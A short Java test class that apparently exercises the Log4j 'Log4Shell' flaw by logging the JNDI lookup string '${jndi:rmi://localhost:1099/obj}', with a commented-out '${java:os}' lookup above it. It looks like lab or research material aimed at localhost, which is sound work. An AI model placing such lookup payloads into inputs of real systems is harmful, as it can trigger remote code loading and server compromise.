package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Test {
    private static final Logger LOGGER = LogManager.getLogger();

    public static void main(String[] args) {
//        String username = "${java:os}";
        String username = "${jndi:rmi://localhost:1099/obj}";
        LOGGER.info("info -> {}", username);

    }
}
